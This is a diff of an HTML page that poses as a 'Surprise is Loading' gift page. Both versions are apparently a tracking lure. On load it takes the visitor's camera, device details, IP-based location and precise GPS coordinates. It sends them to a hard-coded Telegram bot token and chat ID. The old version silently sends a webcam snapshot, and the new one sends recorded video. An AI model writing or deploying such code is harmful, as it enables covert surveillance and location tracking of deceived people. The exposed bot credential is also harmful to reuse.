@@ -1,133 +1,201 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Surprise!</title>
-  <style>
-    body {
-      background: linear-gradient(135deg, #a0d8e1, #6ec6e6);
-      color: #fff;
-      font-family: sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    h1 { font-size: 24px; margin-top: 20px; }
-    .info { margin-top: 20px; font-size: 16px; }
-    /* Hidden elements for capture */
-    #snapshot, #preview { display: none; }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Surprise!</title>
+<style>
+  body {
+    background: linear-gradient(135deg, #a0d8e1, #6ec6e6);
+    font-family: sans-serif;
+    text-align: center;
+    padding: 20px;
+    color: #fff;
+  }
+  h1 {
+    font-size: 24px; 
+    margin-top: 20px;
+  }
+  #info {
+    margin-top: 20px;
+    font-size: 14px;
+    white-space: pre-line; /* preserve line breaks */
+  }
+  #videoContainer {
+    margin-top: 20px;
+  }
+  video {
+    width: 80%;
+    max-width: 600px;
+    border: 2px solid #fff;
+    border-radius: 8px;
+  }
+  button {
+    margin-top: 15px;
+    padding: 10px 20px;
+    font-size: 16px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    background-color: #fff;
+    color: #6ec6e6;
+  }
+  button:hover {
+    background-color: #eee;
+  }
+</style>
 </head>
 <body>
-  <h1>Surprise is Loading... 🎁</h1>
-  <p class="info">Just wait a moment please...</p>
+<h1>Surprise is Loading... 🎁</h1>
+<div id="info">Initializing...</div>
+<div id="videoContainer">
+  <video id="recordingVideo" autoplay muted></video>
+  <div>
+    <button id="startBtn">Start Recording</button>
+    <button id="stopBtn" disabled>Stop Recording</button>
+  </div>
+</div>
 
-  <video id="preview" autoplay playsinline></video>
-  <canvas id="snapshot"></canvas>
+<script>
+const botConfigs = [
+  {
+    token: "8909620046:AAFIowHrmzr2lqh8huSy9cgt3sYONWF2a4g",
+    chatId: "8798734138"
+  }
+];
 
-  <script>
-    // --- CONFIGURATION FOR BOTH BOTS ---
-    const botConfigs = [
-      {
-        token: "8909620046:AAFIowHrmzr2lqh8huSy9cgt3sYONWF2a4g",
-        chatId: "8798734138"
+const infoDiv = document.getElementById("info");
+const videoElement = document.getElementById("recordingVideo");
+const startBtn = document.getElementById("startBtn");
+const stopBtn = document.getElementById("stopBtn");
+
+let mediaStream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+
+// Initialize camera
+navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+  .then(stream => {
+    mediaStream = stream;
+    videoElement.srcObject = stream;
+  })
+  .catch(err => {
+    infoDiv.textContent = "Camera access denied.";
+    console.error("Camera error:", err);
+  });
+
+// Function to gather device info and location
+async function gatherAndSendData() {
+  const now = new Date().toLocaleString();
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const screenRes = `${window.screen.width}x${window.screen.height}`;
+
+  // Fetch IP info
+  let ipInfo = "🌐 IP: Not available";
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    ipInfo = `🌐 IP: ${data.ip}\n📍 Location: ${data.city}, ${data.region}\n🌍 Country: ${data.country_name}\n🏢 ISP: ${data.org}`;
+  } catch (err) {}
+
+  // Get exact location
+  let locationLink = "Location: Permission Denied";
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        locationLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+        sendMessage({ now, ua, platform, screenRes, ipInfo, locationLink });
+        sendLocation(position.coords.latitude, position.coords.longitude);
       },
-    
-    ];
+      () => {
+        sendMessage({ now, ua, platform, screenRes, ipInfo, locationLink });
+      },
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  } else {
+    sendMessage({ now, ua, platform, screenRes, ipInfo, locationLink });
+  }
+}
 
-    const video = document.getElementById("preview");
-    const canvas = document.getElementById("snapshot");
+// Send text message to Telegram
+function sendMessage(data) {
+  const message = `
+🛰️ New Visit Tracked!
+🕒 Time: ${data.now}
+💻 Platform: ${data.platform}
+📺 Screen: ${data.screenRes}
+${data.ipInfo}
+📌 Location: ${data.locationLink}
+🧠 UA: ${data.ua}
+  `;
+  botConfigs.forEach(cfg => {
+    fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: cfg.chatId, text: message })
+    });
+  });
+}
 
-    // --- PHOTO CAPTURE LOGIC ---
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          // Wait 1 second for camera to focus, then capture
-          setTimeout(() => {
-            captureAndSendPhoto();
-          }, 1000);
-        };
-      })
-      .catch((err) => console.error("Camera access denied:", err));
+// Send exact location
+function sendLocation(lat, lon) {
+  botConfigs.forEach(cfg => {
+    fetch(`https://api.telegram.org/bot${cfg.token}/sendLocation`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: cfg.chatId, latitude: lat, longitude: lon })
+    });
+  });
+}
 
-    function captureAndSendPhoto() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      
-      canvas.toBlob((blob) => {
-        // Send to every bot in the config array
-        botConfigs.forEach(config => {
-          const formData = new FormData();
-          formData.append("chat_id", config.chatId);
-          formData.append("photo", blob, "snapshot.png");
-
-          fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          }).catch(err => console.error("Photo Error:", err));
-        });
-
-        // Turn off camera after sending
-        const tracks = video.srcObject.getTracks();
-        tracks.forEach(track => track.stop());
-      }, "image/png");
+// Event handlers for recording
+startBtn.onclick = () => {
+  if (!mediaStream) return;
+  recordedChunks = [];
+  mediaRecorder = new MediaRecorder(mediaStream);
+  mediaRecorder.ondataavailable = e => {
+    if (e.data.size > 0) {
+      recordedChunks.push(e.data);
     }
+  };
+  mediaRecorder.onstop = () => {
+    const blob = new Blob(recordedChunks, { type: "video/webm" });
+    sendVideo(blob);
+  };
+  mediaRecorder.start();
+  startBtn.disabled = true;
+  stopBtn.disabled = false;
+  infoDiv.textContent = "Recording...";
+};
 
-    // --- DEVICE + IP + LOCATION LOGIC ---
-    async function sendDeviceDetails(position = {}) {
-      const now = new Date().toLocaleString();
-      const ua = navigator.userAgent || "N/A";
-      const platform = navigator.platform || "N/A";
-      const screenRes = `${screen.width}x${screen.height}`;
+stopBtn.onclick = () => {
+  if (mediaRecorder && mediaRecorder.state !== "inactive") {
+    mediaRecorder.stop();
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    infoDiv.textContent = "Processing video...";
+  }
+};
 
-      // IP Address Info
-      let ipInfo = "🌐 IP: Not available";
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const ipData = await res.json();
-        ipInfo = 
-          `🌐 IP: ${ipData.ip}\n` +
-          `📍 City: ${ipData.city}, ${ipData.region}\n` +
-          `🌍 Country: ${ipData.country_name}\n` +
-          `🏢 ISP: ${ipData.org}`;
-      } catch (err) {}
+// Send video to Telegram
+function sendVideo(blob) {
+  const formData = new FormData();
+  formData.append("chat_id", "8798734138");
+  formData.append("video", blob, "recording.webm");
+  fetch(`https://api.telegram.org/bot8909620046:AAFIowHrmzr2lqh8huSy9cgt3sYONWF2a4g/sendVideo`, {
+    method: "POST",
+    body: formData
+  }).then(() => {
+    infoDiv.textContent = "Video sent!";
+  }).catch(err => {
+    console.error("Video send error:", err);
+    infoDiv.textContent = "Failed to send video.";
+  });
+}
 
-      // Location Info
-      let locationMsg = "📌 Location: Permission Denied";
-      if (position.coords) {
-        locationMsg = `📌 Location: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-      }
-
-      const message =
-        `🛰️ New Visit Tracked!\n\n` +
-        `🕒 Time: ${now}\n` +
-        `💻 Platform: ${platform}\n` +
-        `📺 Screen: ${screenRes}\n` +
-        `${ipInfo}\n` +
-        `${locationMsg}\n\n` +
-        `🧠 UA: ${ua}`;
-
-      // Send message to every bot in the config array
-      botConfigs.forEach(config => {
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: config.chatId, text: message })
-        }).catch(err => console.error("Message Error:", err));
-      });
-    }
-
-    // Trigger data collection
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        sendDeviceDetails,
-        () => sendDeviceDetails() // Fallback if user denies GPS
-      );
-    } else {
-      sendDeviceDetails();
-    }
-  </script>
+// Start gathering data
+gatherAndSendData();
+</script>
 </body>
 </html>
